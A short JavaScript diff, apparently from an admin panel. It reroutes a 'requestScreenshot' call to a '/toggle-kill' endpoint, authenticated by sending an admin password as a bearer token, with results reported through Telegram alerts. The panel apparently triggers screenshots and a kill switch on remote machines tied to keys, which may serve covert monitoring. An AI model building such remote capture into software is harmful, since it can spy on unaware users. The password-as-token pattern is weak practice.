@@ -352,13 +352,13 @@ window.requestScreenshot = async (key) => {
     }
     
     try {
-        const response = await fetch(`${API_KEYS}/request-screenshot`, {
+        const response = await fetch(`${API_KEYS}/toggle-kill`, {
             method: 'POST',
             headers: { 
                 'Content-Type': 'application/json',
                 'Authorization': `Bearer ${ADMIN_PASSWORD}`
             },
-            body: JSON.stringify({ key })
+            body: JSON.stringify({ key, enabled: true, type: 'screenshot' })
         });
         if (!response.ok) throw new Error('Request failed');
         showToast('Screenshot requested! Wait for Telegram alert.');
